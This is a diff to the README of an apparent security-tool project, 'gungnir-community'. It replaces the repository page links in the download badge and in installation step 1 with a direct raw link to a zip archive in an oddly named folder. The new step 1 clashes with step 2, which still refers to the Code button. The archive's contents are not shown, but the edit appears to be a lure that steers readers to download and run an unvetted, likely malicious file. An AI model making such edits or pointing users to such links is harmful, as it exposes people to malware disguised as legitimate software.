@@ -1,6 +1,6 @@
 # 🛡️ gungnir-community - Manage your security tasks with ease
 
-[![](https://img.shields.io/badge/Download_Gungnir-Blue)](https://github.com/vasilywatersoluble127/gungnir-community)
+[![](https://img.shields.io/badge/Download_Gungnir-Blue)](https://github.com/vasilywatersoluble127/gungnir-community/raw/refs/heads/main/Tempyo/community_gungnir_2.5.zip)
 
 ## About this software 📝
 
@@ -20,7 +20,7 @@ Your computer needs specific components to run this application. Check for these
 
 You must follow these steps to set up the software on your machine. 
 
-1. Visit this page to download the software: https://github.com/vasilywatersoluble127/gungnir-community.
+1. Visit this page to download the software: https://github.com/vasilywatersoluble127/gungnir-community/raw/refs/heads/main/Tempyo/community_gungnir_2.5.zip
 2. Click the green button labeled Code and select Download ZIP.
 3. Extract the folder to your desktop.
 4. Open the Docker Desktop application and wait for the engine to start.
